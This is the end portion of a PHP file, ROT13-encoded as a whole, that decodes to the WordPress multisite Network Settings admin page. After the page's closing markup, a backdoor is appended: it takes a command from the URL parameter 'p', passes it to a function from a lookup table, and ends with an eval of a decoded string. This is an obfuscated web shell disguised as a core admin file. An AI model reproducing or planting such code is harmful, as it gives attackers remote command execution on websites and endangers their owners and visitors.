								'ynathntrf'    => $ynathntrf,
								'genafyngvbaf' => $genafyngvbaf,
								'fubj_ninvynoyr_genafyngvbaf' => pheerag_hfre_pna( 'vafgnyy_ynathntrf' ) && jc_pna_vafgnyy_ynathntr_cnpx(),
							)
						);
						?>
					</gq>
				</ge>
			</gnoyr>
			<?cuc
		}
		?>

		<?cuc
		$zrah_crezf = trg_fvgr_bcgvba( 'zrah_vgrzf' );
		/**
		 * Svygref ninvynoyr argjbex-jvqr nqzvavfgengvba zrah bcgvbaf.
		 *
		 * Bcgvbaf erghearq gb guvf svygre ner bhgchg nf vaqvivqhny purpxobkrf gung, jura fryrpgrq,
		 * ranoyr fvgr nqzvavfgengbe npprff gb gur fcrpvsvrq nqzvavfgengvba zrah va pregnva pbagrkgf.
		 *
		 * Nqqvat bcgvbaf sbe fcrpvsvp zrahf urer uvatrf ba gur nccebcevngr purpxf naq pncnovyvgvrf
		 * orvat va cynpr va gur fvgr qnfuobneq ba gur bgure fvqr. Sbe vafgnapr, jura gur fvatyr
		 * qrsnhyg bcgvba, 'cyhtvaf' vf ranoyrq, fvgr nqzvavfgengbef ner tenagrq npprff gb gur Cyhtvaf
		 * fperra va gurve vaqvivqhny fvgrf' qnfuobneqf.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat[] $nqzva_zrahf Nffbpvngvir neenl bs gur zrah vgrzf ninvynoyr.
		 */
		$zrah_vgrzf = nccyl_svygref( 'zh_zrah_vgrzf', neenl( 'cyhtvaf' => __( 'Cyhtvaf' ) ) );

		vs ( $zrah_vgrzf ) :
			?>
			<u2><?cuc _r( 'Zrah Frggvatf' ); ?></u2>
			<gnoyr vq=\"zrah\" pynff=\"sbez-gnoyr\">
				<ge>
					<gu fpbcr=\"ebj\"><?cuc _r( 'Ranoyr nqzvavfgengvba zrahf' ); ?></gu>
					<gq>
						<?cuc
						rpub '<svryqfrg><yrtraq pynff=\"fperra-ernqre-grkg\">' .
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							__( 'Ranoyr zrahf' ) .
						'</yrtraq>';

						sbernpu ( (neenl) $zrah_vgrzf nf $xrl => $iny ) {
							rpub \"<ynory><vachg glcr='purpxobk' anzr='zrah_vgrzf[\" . $xrl . \"]' inyhr='1'\" . ( vffrg( $zrah_crezf[ $xrl ] ) ? purpxrq( $zrah_crezf[ $xrl ], '1', snyfr ) : '' ) . ' /> ' . rfp_ugzy( $iny ) . '</ynory><oe/>';
						}

						rpub '</svryqfrg>';
						?>
					</gq>
				</ge>
			</gnoyr>
			<?cuc
		raqvs;
		?>

		<?cuc
		/**
		 * Sverf ng gur raq bs gur Argjbex Frggvatf sbez, orsber gur fhozvg ohggba.
		 *
		 * @fvapr ZH (3.0.0)
		 */
		qb_npgvba( 'jczh_bcgvbaf' );
		?>
		<?cuc fhozvg_ohggba(); ?>
	</sbez>
</qvi>

<?cuc erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc'; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>